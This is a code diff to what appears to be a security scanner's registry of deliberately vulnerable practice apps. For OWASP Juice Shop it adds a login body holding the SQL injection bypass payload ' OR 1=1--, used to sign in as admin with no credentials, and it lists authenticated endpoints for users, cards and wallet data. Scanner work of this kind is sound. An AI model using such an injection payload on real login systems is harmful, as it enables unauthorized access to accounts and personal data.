@@ -21,12 +21,21 @@ class KnownApp:
     name: str
     # (method, path, body, content_type) — body/content_type only for POST/PUT
     endpoints: list[tuple]
+    # Optional auto-auth: (login_path, login_body, token_json_path).
+    # Used to obtain a session token for authenticated scanning. For apps with
+    # a known auth-bypass (e.g. Juice Shop login SQLi) the login_body IS the
+    # bypass payload, so we can self-authenticate as admin with no real creds.
+    auth: Optional[tuple] = None
 
 
 KNOWN_APPS: dict[str, KnownApp] = {
     "juice-shop": KnownApp(
         app_id="juice-shop",
         name="OWASP Juice Shop",
+        # Self-authenticate as admin via the login SQLi bypass — no creds needed.
+        auth=("/rest/user/login",
+              '{"email":"\' OR 1=1--","password":"x"}',
+              "authentication.token"),
         endpoints=[
             # Classic UNION-based SQLi in product search
             ("GET", "/rest/products/search?q=apple", None, None),
@@ -43,6 +52,12 @@ KNOWN_APPS: dict[str, KnownApp] = {
              '{"comment":"1","rating":1}', "application/json"),
             ("PUT", "/rest/basket/1",
              '{"id":1}', "application/json"),
+            # Authenticated-only endpoints (need a token — see .auth above)
+            ("GET", "/api/Users/1", None, None),
+            ("GET", "/rest/basket/1", None, None),
+            ("GET", "/api/Addresss?id=1", None, None),
+            ("GET", "/api/Cards?id=1", None, None),
+            ("GET", "/rest/wallet/balance", None, None),
         ],
     ),
     "badstore": KnownApp(
